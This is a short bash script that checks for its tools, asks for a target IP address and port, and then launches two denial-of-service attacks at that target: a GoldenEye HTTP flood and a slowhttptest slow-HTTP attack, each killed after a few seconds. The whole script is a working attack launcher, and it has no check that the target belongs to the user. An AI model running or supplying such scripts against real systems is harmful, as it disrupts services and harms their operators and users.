#!/bin/bash

check_program() {
	if ! command -v "$1" &>/dev/null; then
		echo "$1 is not installed. Please install it and try again."
		exit 1
	fi
}

check_program python
check_program slowhttptest

#I have to do this like this cause the kali package for goldeneye is broken
if [ ! -f "GoldenEye/goldeneye.py" ]; then
	echo "GoldenEye filepath not found. Please make sure it's installed in your home-dir /Goldeneye/goldeneye.py "
	exit 1
fi

read -p "Enter the IP address: " ip_address
read -p "Enter the port: " port

python GoldenEye/goldeneye.py http://$ip_address:$port/ -d &
sleep 5
pkill -f goldeneye

slowhttptest -u http://$ip_address:$port/
sleep 30
pkill slowhttptest
